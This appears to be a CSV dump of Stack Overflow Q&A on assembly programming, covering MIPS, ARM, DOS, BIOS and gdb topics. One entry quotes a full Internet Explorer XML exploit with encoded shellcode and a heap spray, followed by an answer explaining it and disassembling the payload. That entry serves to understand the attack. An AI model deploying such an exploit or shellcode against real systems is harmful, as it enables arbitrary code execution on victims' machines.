","<p>Your logic for base 10 conversion looks good: each remainder from dividing by 10 will give you a digit, and they will be ordered from the least significant digit to the most significant one, so you need to reverse the obtained digits before printing them. Pushing them to a stack and popping them when done will do the reversing in a nice and compact way.</p>

<p>For converting to hex, the operation is the same: divide by 16, get the remainder, reverse, and print. However, there are a few things to note: dividing by 16 is shifting right 4 bits. Remainder is <code>value AND 0fH</code>, so you don't actually need any arithmetic operations. Bit shifts and <code>AND</code> operation is sufficient. Moreover, you don't even need to involve the stack. You can do this from most significant nibble (four bits) to the least significant one, and print as you calculate them. The second thing that you seem to be struggling with is converting a nibble to a hex digit. Simply adding <code>30h</code> is not enough. It is good enough for decimals, but for hex values, you've got the numbers 10 to 15 as well. These need to be added to <code>41h</code> ('A' in ASCII) minus 10 instead. Alternatively, you can put the digits '0' to '9' and 'A' to 'F' in a table, and index them by the value of the nibble you want to print.</p>

<p>You may also want to write a routine that will read a number from input. Read each digit until you read a newline, convert character to decimal value, and update an accumulator that will keep the number you've read. You will need to use this for both hex and decimal output functions.</p>
","10288232"
"Jump instruction in MIPS Assembly","36768","","<p>Here is some MIPS assembly code I wrote to test the jump instruction:</p>

<pre><code>addi $a0, $0, 1
j next
next:
j skip1
add $a0, $a0, $a0
skip1:
j skip2:
add $a0, $a0, $a0
add $a0, $a0, $a0
skip2:
j skip3
loop:
add $a0, $a0, $a0
add $a0, $a0, $a0
add $a0, $a0, $a0
skip3:
j loop
</code></pre>

<p>When I run the assembler, here's the result:</p>

<pre><code>[0x000000]  0x20040001  # addi $a0, $zero, 1 ($a0 = 1)
[0x000004]  0x08000002  # j 0x0002 (jump to addr 0x0008)
[0x000008]  0x08000004  # j 0x0004 (jump to addr 0x0010)
[0x00000C]  0x00842020  # add $a0, $a0, $a0 ($a0 = $a0 + $a0)
[0x000010]  0x08000007  # j 0x0007 (jump to addr 0x001C)
[0x000014]  0x00842020  # add $a0, $a0, $a0 ($a0 = $a0 + $a0)
[0x000018]  0x00842020  # add $a0, $a0, $a0 ($a0 = $a0 + $a0)
[0x00001C]  0x0800000B  # j 0x000B (jump to addr 0x002C)
[0x000020]  0x00842020  # add $a0, $a0, $a0 ($a0 = $a0 + $a0)
[0x000024]  0x00842020  # add $a0, $a0, $a0 ($a0 = $a0 + $a0)
[0x000028]  0x00842020  # add $a0, $a0, $a0 ($a0 = $a0 + $a0)
[0x00002C]  0x08000008  # j 0x0008 (jump to addr 0x0020)
</code></pre>

<p>Looking at the machine code for the jump instructions, this is what I see:</p>

<pre><code>1st jump (just jumps to next instruction) 0x08000002
2nd jump (skips 1 instruction) 0x08000004
3rd jump (skips 2 instructions) 0x08000007
4th jump (skips 3 instructions) 0x0800000B
5th jump (skips 3 instructions backwards) 0x08000008
</code></pre>

<p>From looking at these instructions, it looks like the machine code starts with a 08 for the jump instruction, and the number at the end tells the jump instruction where to go. However, I can not figure out how this number is calculated. Also, there is nothing to indicate to me that the 5th jump is a backwards jump.</p>

<p>How is the jump value calculated?</p>
","<p>Just look into a reference manual for more details about the opcode encoding.</p>

<p>Short version: In a 32 bit instruction you can not include a 32-bit jump destination. The opcode uses 6 bits, which leaves 26 bits for the instruction. The target address is constructed by taking the first 4 bits of the address of the instruction following the <code>j</code> instruction, then 2 zero bits are appended to the 26 bits from the jump instruction operand. (As the instructions are 32 bits, alignment is useful and allows the omitting of the last two 0's.)</p>

<p>To the backward jump: The addresses are absolute, NOT relative, so it only depends on the address of the jump instruction, whether it is a forward or a backward jump.</p>

<p><strong>EDIT</strong>: More detailed description:
We have at address <em>x</em> jump instruction <em>j</em>. Let <em>t</em> represent the jump operand of <em>j</em>. <em>t</em> is 26 bit wide.
The bit pattern of address of the next instruction is computed as follows:</p>

<pre><code>upper_6_bits_of(x+4),t,0,0
</code></pre>

<p>So the jump is <strong>ALWAYS</strong> absolute. There are no relative jumps. when the result is smaller than x then it is a backward jump, when it is greater it is a forward jump (and if you want something stupid, you make it equal ;-).</p>

<p>So let's look at the 5th jump of your example:</p>

<p>The first 6 bits of the jump target are: 000000, because the upper 6 bits of the address of the instruction behind the jump are 000000.</p>

<p>The next 26 bits are the lowest 26 bits of the jump instruction, that is 00000000000000000000001000</p>

<p>The last 2 bits are: 00, because the got always appended.</p>

<p>Together we have: 0000000000000000000000000000100000, which is hex 20. And at that address is exactly the label/instruction where the flow should continue.</p>
","7877528"
"Converting very simple ARM instructions to binary/hex","36634","","<p>I've been trying to use <strong><a href=""http://www.nyx.net/~troddis/ARM.html"" rel=""noreferrer"">this page</a></strong> as well as various other guides to figure out how to express very simple ARM instructions as binary and hex. It seems like it should be a straightforward process to me, but I still don't understand. Here's a few examples.</p>

<p>Basic NOP:</p>

<pre><code>       what goes here?          what goes here?
             _↓_                  _____↓____
            |   |                |          |
mov r0, r0 ; ????00?1101?????????????????????
                         |__||__|
                          ↑    ↑
                 how do I express registers?
</code></pre>

<p>Same basic question for others.</p>

<p>Comparing two registers:</p>

<pre><code>cmp r1, r0
</code></pre>

<p>Adding immediate to register value:</p>

<pre><code>add r0, #0x1a
</code></pre>

<p>All of these tutorials online are excellent at describing how to use instructions like these, but none I have been able to find actually walk through how to convert an ARM instruction in to the binary/hex/machine code into which it gets assembled.</p>

<p>Thanks in advance for your help.</p>
","<p>Here is how data processing instructions are coded:</p>

<p><img src=""https://i.stack.imgur.com/0cPOx.png"" alt=""ARM data processing instructions""></p>

<p>You have condition codes table in that page of yours. Registers are coded <code>0000</code> through <code>1111</code>.</p>

<p>All your examples fall under the same category. The picture is extracted from some document on my HDD, but I also managed to find it by <a href=""http://www.ic.unicamp.br/~ranido/mc404/arm/arm-instructionset.pdf"">google</a>. Coding those instructions is a tedious job.</p>

<p>So, <code>mov r0, r0</code> should go like this:</p>

<pre><code>1110 00 0 0 1101 0000 0000 00000000
</code></pre>

<p>I put Rn to 0, because it is not actually applicable to <code>MOV</code>. In case of <code>CMP</code>, I believe, <code>S</code> is always 1. </p>
","11786481"
"Writing my own BIOS","36385","","<p>I'm not crazy, just reinventing the wheel :D<br>
I wrote boot-loaders, mouse &amp; keyboard mini-drivers, mini OS and so on.  </p>

<p>I'm always trying to avoid DOS interrupts, using BIOS ones only, trying to go forward a unity mini OS, but suddenly I decided to write my own BIOS :)  </p>

<p>The Legend said :<br>
I was high-level programmer, then low-level one. One day I'll be machine-language programmer!</p>

<p>Is a BIOS written in assembly?  How can I flash it? What's the mechanism?  Can I start editing my current BIOS?</p>
","<p>A BIOS can be written in assembly but doesn't have to be, some parts need to be to get the parameters for the system call since they don't match the compilers calling convention.</p>

<p>How do you flash it?  Varies from motherboard to motherboard, I would start with an open source virtual machine and write a bios for that.  Or create a virtual machine where you have written the bios.  The mechanism varies from vendor to vendor, generally you boot dos (dos is not dead, it is very much alive in the PC world, esp motherboard development and embedded systems).  I wouldn't mess around with a real motherboard, if you don't already know the answers to all of these questions you are going to brick a number of motherboards if you take that path.</p>

<p>You can try to take a bios upgrade for your mother board and reverse engineer it (although there is probably a click through agreement that says that you wont).  If you figure it out you can both load it and hack at at.  I wouldn't go there, you will brick your system before you figure it out.</p>

<p>Is writing a bios really what you are after?  Fairly old school, would be like writing 6502 code for fun.  There are many low level problems that are more useful and as interesting.  </p>

<p>If you can write asm the writing machine code is not that difficult at all, you could just go do that for fun.  x86 is dreadful, you should spend some time learning other systems and their asm and machine code (and writing operating systems for them).  ARM dominates the world and doesn't rely on a bios.  I have been told that to get a video card up on a non-x86 system you still have to fiddle something in x86 on the x86 bios, could figure out how to bring up a mainstream video card without the need to run the x86 bios.  watch an emulator run the bios and see what it does, figure it out replace that power on init without the bios doing it...Writing an instruction set simulator or disassembler is the next step beyond writing machine code, I wouldn't waste even a second of time on x86 though, I can suggest a list of alternatives (or you could just play with the simulators I have written or collected).</p>

<p>If an x86 bios is the way you want to go, your best path is to write, replace, or hack on a bios for a virtual machine being qemu, virtualbox, or other.  Replacing that bios with yours would likely be replacing a file in some directory or using a command line option to specify an alternate bios.  Once you are well experienced in that then if there are still motherboards with legacy bioses on them perhaps you can hack your way into programming one (need to buy several of each type of motherboard as you WILL brick some).  With so many embedded systems out there that can be had for $20 to $200 with the same level of experience gained, it doesn't make sense to hack on a pc motherboard without decent schematics and documentation.  You could dig up an original PC with the schematic and bios listing being documented, and the bios being socketed so if yours doesn't boot (and doesn't destroy the motherboard) it isn't a brick you can reprogram or replace the bios chip.  Probably want to use a microcontroller to stand in as a fake bios, as finding the right hardware to reprogram more bios chips is perhaps harder to find that working original PC's...There is an amiga community that is likely a lot more fun and would be happy to have you improving/tweaking their bios, say putting modern hardware behind the legacy system calls.</p>
","10891215"
"Assembly, printing ascii number","35403","","<p>I have a problem with my assembly code. I want to print number stored in register cx, but when i tried to print it, it printed ascii character instead of ascii number, so I decided to write a procedure to convert ascii char to ascii value. 
Problem is, that when I try to call that procedure, the program freezes and I have to restart dosbox. Does anyone know whats wrong with this code? Thanks.</p>

<pre><code>P4      PROC                
            MOV AX,CX           ;CX = VALUE THAT I WANT TO CONVERT
            MOV BX,10           
    ASC2:
            DIV BX              ;DIV AX/10
            ADD DX,48           ;ADD 48 TO REMAINDER TO GET ASCII CHARACTER OF NUMBER 
            PUSH AX             ;SAVE AX
            MOV AH,2            ;PRINT REMAINDER STORED IN DX
            INT 21H             ;INTERRUP
            POP AX              ;POP AX BACK
            CMP AX,0            
            JZ EXTT             ;IF AX=0, END OF THE PROCEDURE
            JMP ASC2            ;ELSE REPEAT
    EXTT:
            RET
    P4      ENDP
</code></pre>
","<p>Something like this would work better for printing a decimal value (the new code is in lowercase):</p>

<pre><code>        mov byte [buffer+9],'$'
        lea si,[buffer+9]

        MOV AX,CX           ;CX = VALUE THAT I WANT TO CONVERT
        MOV BX,10         
ASC2:
        mov dx,0            ; clear dx prior to dividing dx:ax by bx
        DIV BX              ;DIV AX/10
        ADD DX,48           ;ADD 48 TO REMAINDER TO GET ASCII CHARACTER OF NUMBER 
        dec si              ; store characters in reverse order
        mov [si],dl
        CMP AX,0            
        JZ EXTT             ;IF AX=0, END OF THE PROCEDURE
        JMP ASC2            ;ELSE REPEAT
EXTT:
        mov ah,9            ; print string
        mov dx,si
        int 21h
        RET

buffer: resb 10
</code></pre>

<p>Instead of printing each character directly it adds the characters to a buffer in reverse order. For the value 123 it would add '3' at buffer[8], '2' at buffer[7] and '1' at buffer[6] - so if you then print the string starting at buffer+6 you get ""123"".<br>I'm using NASM syntax but hopefully it should be clear enough.</p>
","15621644"
"Help me understand this JavaScript exploit","35350","","<p>I usually do not have difficulty to read JavaScript script but this one I can't figure out the logic. The code is from an Exploit that has been published 4 days ago. You can find it at <a href=""http://www.milw0rm.com/exploits/7477"" rel=""noreferrer"">milw0rm</a>.</p>

<p>Here is the code:</p>

<pre><code>&lt;html&gt;
    &lt;div id=""replace""&gt;x&lt;/div&gt;
    &lt;script&gt;
        // windows/exec - 148 bytes
        // http://www.metasploit.com
        // Encoder: x86/shikata_ga_nai
        // EXITFUNC=process, CMD=calc.exe
        var shellcode = unescape(""%uc92b%u1fb1%u0cbd%uc536%udb9b%ud9c5%u2474%u5af4%uea83%u31fc%u0b6a%u6a03%ud407%u6730%u5cff%u98bb%ud7ff%ua4fe%u9b74%uad05%u8b8b%u028d%ud893%ubccd%u35a2%u37b8%u4290%ua63a%u94e9%u9aa4%ud58d%ue5a3%u1f4c%ueb46%u4b8c%ud0ad%ua844%u524a%u3b81%ub80d%ud748%u4bd4%u6c46%u1392%u734a%u204f%uf86e%udc8e%ua207%u26b4%u04d4%ud084%uecba%u9782%u217c%ue8c0%uca8c%uf4a6%u4721%u0d2e%ua0b0%ucd2c%u00a8%ub05b%u43f4%u24e8%u7a9c%ubb85%u7dcb%ua07d%ued92%u09e1%u9631%u5580"");

        // ugly heap spray, the d0nkey way!
        // works most of the time
        var spray = unescape(""%u0a0a%u0a0a"");

        do {
           spray += spray;
        } while(spray.length &lt; 0xd0000);

        memory = new Array();

        for(i = 0; i &lt; 100; i++)
           memory[i] = spray + shellcode;

        xmlcode = ""&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;image SRC=http://&amp;#x0a0a;&amp;#x0a0a;.example.com&gt;]]&gt;&lt;/C&gt;&lt;/X&gt;&lt;/XML&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;XML ID=I&gt;&lt;/XML&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;&lt;/SPAN&gt;"";

        tag = document.getElementById(""replace"");
        tag.innerHTML = xmlcode;

    &lt;/script&gt;
&lt;/html&gt;
</code></pre>

<p>Here is what I believe it does and I would like you to help me for the part that I misunderstand.</p>

<p>The variable <code>shellcode</code> contain the code to open the calc.exe. I do not get it how they have found that weird string... any idea?</p>

<p>The second thing is the variable <code>spray</code>. I do not understand this weird loop?</p>

<p>The third thing is the variable <code>memory</code> that is never used anywhere, why do they create it?</p>

<p>Last thing, What does the XML tag do in the page?</p>

<h2>Update</h2>

<p>Alright, for the moment I have good answers but mostly very
general. I would like more explanations of the value of the
code. An example is <code>unescape(""%u0a0a%u0a0a"");</code>. What does it mean?
Same thing for the loop, why did the developer write:
<code>length &lt; 0xd0000</code>? I would like a deeper understanding, not
only the theory of this code.</p>
","<p>The shellcode contains some x86 assembly instructions that will do the actual exploit. <code>spray</code> creates a long sequence of instructions that will be put in <code>memory</code>. Since we can't usually find out the exact location of our shellcode in memory, we put a lot of <code>nop</code> instructions before it and jump to somewhere there. The <code>memory</code> array will hold the actual x86 code along with the jumping mechanism. We'll feed the crafted XML to the library which has a bug. When it's being parsed, the bug will cause the instruction pointer register to be assigned to somewhere in our exploit, leading to arbitrary code execution.</p>

<p>To understand more deeply, you should actually figure out what is in the x86 code. <code>unscape</code> will be used to put the sequence of bytes represented of the string in the <code>spray</code> variable. It's valid x86 code that fills a large chunk of the heap and jumps to the start of shellcode. The reason for the ending condition is string length limitations of the scripting engine. You can't have strings larger than a specific length.</p>

<p>In x86 assembly, <code>0a0a</code> represents <code>or cl, [edx]</code>. This is effectively equivalent to <code>nop</code> instruction for the purposes of our exploit. Wherever we jump to in the <code>spray</code>, we'll get to the next instruction until we reach the shellcode which is the code we actually want to execute.</p>

<p>If you look at the XML, you'll see <code>0x0a0a</code> is there too. Exactly describing what happens requires specific knowledge of the exploit (you have to know where the bug is and how it's exploited, which I don't know). However, it seems that we force Internet Explorer to trigger the buggy code by setting the <code>innerHtml</code> to that malicious XML string. Internet Explorer tries to parse it and the buggy code somehow gives control to a location of memory where the array exists (since it's a large chunk, the probability of jumping there is high). When we jump there the CPU will keep executing <code>or cl, [edx]</code> instructions until in reaches the beginning of shellcode that's put in memory.</p>

<p>I've disassembled the shellcode:</p>

<pre><code>00000000  C9                leave
00000001  2B1F              sub ebx,[edi]
00000003  B10C              mov cl,0xc
00000005  BDC536DB9B        mov ebp,0x9bdb36c5
0000000A  D9C5              fld st5
0000000C  2474              and al,0x74
0000000E  5A                pop edx
0000000F  F4                hlt
00000010  EA8331FC0B6A6A    jmp 0x6a6a:0xbfc3183
00000017  03D4              add edx,esp
00000019  07                pop es
0000001A  67305CFF          xor [si-0x1],bl
0000001E  98                cwde
0000001F  BBD7FFA4FE        mov ebx,0xfea4ffd7
00000024  9B                wait
00000025  74AD              jz 0xffffffd4
00000027  058B8B028D        add eax,0x8d028b8b
0000002C  D893BCCD35A2      fcom dword [ebx+0xa235cdbc]
00000032  37                aaa
00000033  B84290A63A        mov eax,0x3aa69042
00000038  94                xchg eax,esp
00000039  E99AA4D58D        jmp 0x8dd5a4d8
0000003E  E5A3              in eax,0xa3
00000040  1F                pop ds
00000041  4C                dec esp
00000042  EB46              jmp short 0x8a
00000044  4B                dec ebx
00000045  8CD0              mov eax,ss
00000047  AD                lodsd
00000048  A844              test al,0x44
0000004A  52                push edx
0000004B  4A                dec edx
0000004C  3B81B80DD748      cmp eax,[ecx+0x48d70db8]
00000052  4B                dec ebx
00000053  D46C              aam 0x6c
00000055  46                inc esi
00000056  1392734A204F      adc edx,[edx+0x4f204a73]
0000005C  F8                clc
0000005D  6E                outsb
0000005E  DC8EA20726B4      fmul qword [esi+0xb42607a2]
00000064  04D4              add al,0xd4
00000066  D084ECBA978221    rol byte [esp+ebp*8+0x218297ba],1
0000006D  7CE8              jl 0x57
0000006F  C0CA8C            ror dl,0x8c
00000072  F4                hlt
00000073  A6                cmpsb
00000074  47                inc edi
00000075  210D2EA0B0CD      and [0xcdb0a02e],ecx
0000007B  2CA8              sub al,0xa8
0000007D  B05B              mov al,0x5b
0000007F  43                inc ebx
00000080  F4                hlt
00000081  24E8              and al,0xe8
00000083  7A9C              jpe 0x21
00000085  BB857DCBA0        mov ebx,0xa0cb7d85
0000008A  7DED              jnl 0x79
0000008C  92                xchg eax,edx
0000008D  09E1              or ecx,esp
0000008F  96                xchg eax,esi
00000090  315580            xor [ebp-0x80],edx
</code></pre>

<p>Understanding this shellcode requires x86 assembly knowledge and the problem in the MS library itself (to know what the system state is when we reach here), not JavaScript! This code will in turn execute <code>calc.exe</code>.</p>
","381205"
"What is the difference between unconditional branch and unconditional jump (instructions in MIPS)?","34805","","<p>You may look into <a href=""http://en.wikipedia.org/wiki/MIPS_architecture#MIPS_assembly_language"">Wikipedia</a> or <a href=""http://logos.cs.uic.edu/366/notes/MIPS%20Quick%20Tutorial.htm"">short summary for students</a>. Everybody says that there are two instructions for the same thing. But nobody tells why?</p>
","<p>Branches allow for conditions. But allowing for conditions takes up more bits in the instruction. Therefore, a branch's address is only 2^16 bits and only allows you to branch 2^15 - 1 instructions backward or 2^15 instructions forward.</p>

<p>A jump is unconditional and the bits saved by leaving out the condition can be used for the address. A jump allows for a 26 bit address and so can jump much further in the code than a branch. At the expense of not being conditional.</p>
","10981780"
"Floating Point Modulo Operation","34191","","<p>I am trying to implement the range reduction operation for trigonometry.  But instead I think it might be better to just perform a modulo pi/2 operation on incoming data. I was wondering what algorithms exist and are efficient for this operation for 32-bit IEEE 754 floating-point?</p>

<p>I have to implement this in assembly, so fmod, division, multiplication, etc. aren't available to me with just one instruction. My processor uses 16-bit words and I have implemented 32-bit floating point addition, subtraction, multiplication, division, square root, cosine, and sine. I just need range reduction (modulus) for inputting values to cosine and sine. </p>
","<p>I think standard library's <code>fmod()</code> will be the best choice in most cases. Here's a <a href=""http://www.codeguru.com/forum/showthread.php?t=438110"" rel=""noreferrer"">link</a> to a discussion of several simple algorithms.</p>

<p>On my machine, <code>fmod()</code> uses optimized inline assembly code (<code>/usr/include/bits/mathinline.h</code>):</p>

<pre><code>#if defined __FAST_MATH__ &amp;&amp; !__GNUC_PREREQ (3, 5)
__inline_mathcodeNP2 (fmod, __x, __y, \
  register long double __value;                           \
  __asm __volatile__                                  \
    (""1:    fprem\n\t""                            \
     ""fnstsw    %%ax\n\t""                             \
     ""sahf\n\t""                                   \
     ""jp    1b""                               \
     : ""=t"" (__value) : ""0"" (__x), ""u"" (__y) : ""ax"", ""cc"");           \
  return __value)
#endif
</code></pre>

<p>So it actually uses a dedicated CPU instruction (fprem) for the calculation.</p>
","9505761"
"Is inline assembly language slower than native C++ code?","34149","","<p>I tried to compare the performance of inline assembly language and C++ code, so I wrote a function that add two arrays of size 2000 for 100000 times. Here's the code:</p>

<pre><code>#define TIMES 100000
void calcuC(int *x,int *y,int length)
{
    for(int i = 0; i &lt; TIMES; i++)
    {
        for(int j = 0; j &lt; length; j++)
            x[j] += y[j];
    }
}


void calcuAsm(int *x,int *y,int lengthOfArray)
{
    __asm
    {
        mov edi,TIMES
        start:
        mov esi,0
        mov ecx,lengthOfArray
        label:
        mov edx,x
        push edx
        mov eax,DWORD PTR [edx + esi*4]
        mov edx,y
        mov ebx,DWORD PTR [edx + esi*4]
        add eax,ebx
        pop edx
        mov [edx + esi*4],eax
        inc esi
        loop label
        dec edi
        cmp edi,0
        jnz start
    };
}
</code></pre>

<p>Here's <code>main()</code>:</p>

<pre><code>int main() {
    bool errorOccured = false;
    setbuf(stdout,NULL);
    int *xC,*xAsm,*yC,*yAsm;
    xC = new int[2000];
    xAsm = new int[2000];
    yC = new int[2000];
    yAsm = new int[2000];
    for(int i = 0; i &lt; 2000; i++)
    {
        xC[i] = 0;
        xAsm[i] = 0;
        yC[i] = i;
        yAsm[i] = i;
    }
    time_t start = clock();
    calcuC(xC,yC,2000);

    //    calcuAsm(xAsm,yAsm,2000);
    //    for(int i = 0; i &lt; 2000; i++)
    //    {
    //        if(xC[i] != xAsm[i])
    //        {
    //            cout&lt;&lt;""xC[""&lt;&lt;i&lt;&lt;""]=""&lt;&lt;xC[i]&lt;&lt;"" ""&lt;&lt;""xAsm[""&lt;&lt;i&lt;&lt;""]=""&lt;&lt;xAsm[i]&lt;&lt;endl;
    //            errorOccured = true;
    //            break;
    //        }
    //    }
    //    if(errorOccured)
    //        cout&lt;&lt;""Error occurs!""&lt;&lt;endl;
    //    else
    //        cout&lt;&lt;""Works fine!""&lt;&lt;endl;

    time_t end = clock();

    //    cout&lt;&lt;""time = ""&lt;&lt;(float)(end - start) / CLOCKS_PER_SEC&lt;&lt;""\n"";

    cout&lt;&lt;""time = ""&lt;&lt;end - start&lt;&lt;endl;
    return 0;
}
</code></pre>

<p>Then I run the program five times to get the cycles of processor, which could be seen as time. Each time I call one of the function mentioned above only.</p>

<p>And here comes the result.</p>

<h2>Function of assembly version:</h2>

<pre><code>Debug   Release
---------------
732        668
733        680
659        672
667        675
684        694
Average:   677
</code></pre>

<h2>Function of C++ version:</h2>

<pre><code>Debug     Release
-----------------
1068      168
 999      166
1072      231
1002      166
1114      183
Average:  182
</code></pre>

<p>The C++ code in release mode is almost 3.7 times faster than the assembly code. Why?</p>

<p>I guess that the assembly code I wrote is not as effective as those generated by GCC. It's hard for a common programmer like me to wrote code faster than its opponent generated by a compiler.Does that mean I should not trust the performance of assembly language written by my hands, focus on C++ and forget about assembly language?</p>
","<p>Yes, most times.</p>

<p>First of all you start from wrong assumption that a low-level language (assembly in this case) will always produce faster code than high-level language (C++ and C in this case). It's not true. Is C code always faster than Java code? No because there is another variable: programmer. The way you write code and knowledge of architecture details greatly influence performance (as you saw in this case).</p>

<p>You can <strong>always</strong> produce an example where handmade assembly code is better than compiled code but <strong>usually</strong> it's a fictional example or a single routine not a <em>true</em> program of 500.000+ lines of C++ code). I think compilers will produce better assembly code 95% times and <strong>sometimes, only some rare times,</strong> you may need to write assembly code for few, short, <a href=""http://en.wikipedia.org/wiki/Profiling_%28computer_programming%29"" rel=""noreferrer"">highly used</a>, <a href=""http://www.douglocke.com/Downloads/Performance-Critical%20Systems%20White%20Paper.pdf"" rel=""noreferrer"">performance critical</a> routines or when you have to access features your favorite high-level language does not expose. Do you want a touch of this complexity? Read <a href=""https://stackoverflow.com/a/40355466/1207195"">this awesome answer</a> here on SO. </p>

<p>Why this?</p>

<p>First of all because compilers can do optimizations that we can't even imagine (see <a href=""http://en.wikipedia.org/wiki/Optimizing_compiler"" rel=""noreferrer"">this short list</a>) and they will do them in <em>seconds</em> (when <a href=""https://stackoverflow.com/a/2685541/1207195"">we may need days</a>).</p>

<p>When you code in assembly you have to make well-defined functions with a well-defined call interface. However they can take in account <a href=""http://en.wikipedia.org/wiki/Register_allocation"" rel=""noreferrer"">whole-program optimization</a> and <a href=""https://stackoverflow.com/a/2685541/1207195"">inter-procedural optimization</a> such 
as <a href=""http://en.wikipedia.org/wiki/Register_allocation"" rel=""noreferrer"">register allocation</a>, <a href=""http://en.wikipedia.org/wiki/Constant_folding#Constant_propagation"" rel=""noreferrer"">constant propagation</a>, <a href=""http://en.wikipedia.org/wiki/Common_subexpression_elimination"" rel=""noreferrer"">common subexpression elimination</a>, <a href=""http://en.wikipedia.org/wiki/Instruction_scheduling"" rel=""noreferrer"">instruction scheduling</a> and other complex, not obvious optimizations (<a href=""http://en.wikipedia.org/wiki/Polytope_model"" rel=""noreferrer"">Polytope model</a>, for example). On <a href=""http://en.wikipedia.org/wiki/Reduced_instruction_set_computing"" rel=""noreferrer"">RISC</a> architecture guys stopped worrying about this many years ago (instruction scheduling, for example, is very hard to <a href=""http://www.cs.binghamton.edu/~dima/cs580a/spec_wake_micro00.pdf"" rel=""noreferrer"">tune by hand</a>) and modern <a href=""http://en.wikipedia.org/wiki/Complex_instruction_set_computer"" rel=""noreferrer"">CISC</a> CPUs have very long <a href=""http://en.wikipedia.org/wiki/Instruction_pipeline"" rel=""noreferrer"">pipelines</a> too.</p>

<p>For some complex microcontrollers even <em>system</em> libraries are written in C instead of assembly because their compilers produce a better (and easy to maintain) final code.</p>

<p>Compilers sometimes can <a href=""http://ds9a.nl/gcc-simd/example.html"" rel=""noreferrer"">automatically use some MMX/SIMDx instructions</a> by themselves, and if you don't use them you simply can't compare (other answers already reviewed your assembly code very well).
Just for loops this is a <a href=""http://en.wikipedia.org/wiki/Loop_transformation"" rel=""noreferrer"">short list of loop optimizations</a> of what is <strong>commonly</strong> checked for by a compiler (do you think you could do it by yourself when your schedule has been decided for a C# program?) If you write something in assembly, I think you have to consider at least some <a href=""http://www.mark.masmcode.com"" rel=""noreferrer"">simple optimizations</a>. The school-book example for arrays is to <a href=""http://en.wikipedia.org/wiki/Loop_unrolling"" rel=""noreferrer"">unroll the cycle</a> (its size is known at compile time). Do it and run your test again. <br/></p>

<p>These days it's also really uncommon to need to use assembly language for another reason: the <a href=""http://en.wikipedia.org/wiki/X86#Chronology"" rel=""noreferrer"">plethora of different CPUs</a>. Do you want to support them all? Each has a specific <a href=""http://en.wikipedia.org/wiki/Microarchitecture"" rel=""noreferrer"">microarchitecture</a> and some <a href=""http://en.wikipedia.org/wiki/X86_instruction_listings"" rel=""noreferrer"">specific instruction sets</a>. They have different number of functional units and assembly instructions should be arranged to keep them all <em>busy</em>. If you write in C you may use <a href=""https://en.wikipedia.org/wiki/Profile-guided_optimization"" rel=""noreferrer"">PGO</a> but in assembly you will then need a great knowledge of that specific architecture (and <strong>rethink and redo everything for another architecture</strong>). For small tasks the compiler <em>usually</em> does it better, and for complex tasks <em>usually</em> the work isn't repaid (and <a href=""http://dl.acm.org/citation.cfm?id=74953"" rel=""noreferrer"">compiler <em>may</em> do better</a> anyway).</p>

<p>If you sit down and you take a look at your code probably you'll see that you'll gain more to redesign your algorithm than to translate to assembly (read this <a href=""https://stackoverflow.com/questions/926266/performance-optimization-strategies-of-last-resort/927773#927773"">great post here on SO</a>), there are high-level optimizations (and hints to compiler) you can effectively apply before you need to resort to assembly language. It's probably worth to mention that often using intrinsics you will have performance gain your're looking for and compiler will still be able to perform most of its optimizations.</p>

<p>All this said, even when you can produce a 5~10 times faster assembly code, you should ask your customers if they prefer to <strong>pay</strong> one week of <strong>your time</strong> or to <strong>buy a 50$ faster CPU</strong>. Extreme optimization more often than not (and especially in LOB applications) is simply not required from most of us.</p>
","9601625"
"How to use MOV instruction in ARM with an immediate number as the second operand","33995","","<p>I just begin to study ARM assembly language, and am not clear about how to use MOV to transfer an immediate number into a register.</p>

<p>From both the ARM reference manual and my textbook, it's said that range of immediate number following MOV instruction is 0-255. But when I test on my own PC in ADS 1.2 IDE, instruction</p>

<pre><code>MOV     R2, #0xFFFFFFFF
</code></pre>

<p>performs well. Isn't number 0xFFFFFFFF out of range according to the specification?</p>

<p>Hope someone can give me a hand.</p>

<p>Regards.</p>
","<p>Remember that the ARM can perform a certain set of manipulations on the immediate value as part of the barrel shifter that is incorporated into the ARM's opcodes.</p>

<p>This little article has one of the clearest explanations of some of the tricks that an ARM assembler can use to fit a large immediate number into the small available space of an ARM instruction:</p>

<ul>
<li><a href=""http://www.davespace.co.uk/arm/introduction-to-arm/immediates.html"" rel=""noreferrer"">http://www.davespace.co.uk/arm/introduction-to-arm/immediates.html</a></li>
</ul>

<p>The article discusses the trick likely used in your specific example of generating a MVN opcode to load the bitwise complement of the immediate value.</p>

<p>These kinds of manipulation can't be done with all immediate values, but the ARM assemblers are supposedly pretty smart about it (and C compilers certainly are). If no shift/complement tricks can be performed, the value will generally be loaded from a PC-relative location or maybe by 'building up' the value from several instructions.</p>
","2624575"
"Switching to assembly in gdb","33966","","<p>Is there is any way to switch to assembly when debugging a C or C++ program in gdb ? (Given that all source files and their corresponding assembly files are available)</p>
","<p>There is a way to disassemble a function or a certain section of code, is that what you are after?</p>

<p>The command to do so would be <code>disassemble &lt;function name&gt;</code> or a memory location.</p>

<p>Is this what you are referring to?</p>

<pre><code>(gdb) help disassemble
Disassemble a specified section of memory.
Default is the function surrounding the pc of the selected frame.
With a single argument, the function surrounding that address is dumped.
Two arguments are taken as a range of memory to dump.
</code></pre>
","589665"
"What are .S files ?","33376","","<p>I've seen .S files in various projects such as in the Linux Kernel, FreeBSD kernel, or in some other projects.  What do these files do and why cant we have .C files instead ? </p>
","<p><code>.S</code> files are source code files written in assembly. Assembly is an extremely low-level form of programming. The files contain assembly instructions to the processor in sequential order and are typically compiled based on a selected architecture. Examples of such files are often seen in the linux kernel for specific architectures, e.g. x86, sparc, ARM, etc. </p>

<p>For more information about assembly language:</p>

<ul>
<li><a href=""https://en.wikibooks.org/wiki/X86_Assembly/GAS_Syntax"" rel=""nofollow noreferrer"">X86 Assembly/GAS syntax</a></li>
<li><a href=""https://en.wikipedia.org/wiki/X86_instruction_listings"" rel=""nofollow noreferrer"">x86 Instruction list</a></li>
<li><a href=""http://www.tldp.org/HOWTO/Assembly-HOWTO/"" rel=""nofollow noreferrer"">TLDP Linux Assembly Howto</a></li>
<li>Example in the Linux kernel: <a href=""https://github.com/torvalds/linux/blob/177366bf7ceb35860281a6ebe824e42bf96fd95d/arch/x86/net/bpf_jit.S"" rel=""nofollow noreferrer"">arch/x86/net/bpf_jit.S</a></li>
</ul>
